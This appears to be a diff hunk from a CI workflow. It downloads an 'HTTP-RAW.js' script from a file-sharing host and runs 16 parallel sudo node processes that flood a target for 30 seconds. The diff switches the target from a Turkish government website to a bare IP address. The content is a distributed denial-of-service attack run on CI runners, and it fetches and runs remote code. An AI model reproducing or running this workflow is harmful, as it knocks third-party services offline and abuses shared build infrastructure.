@@ -17,7 +17,7 @@ jobs:
           wget https://up.zip/4fxkv/index.js -O HTTP-RAW.js
           PIDS=()
           for i in {1..16}; do
-            sudo timeout 30 node HTTP-RAW.js https://www.turkiye.gov.tr/ 30 &
+            sudo timeout 30 node HTTP-RAW.js http://142.171.195.145 30 &
             PIDS+=($!)
           done
           
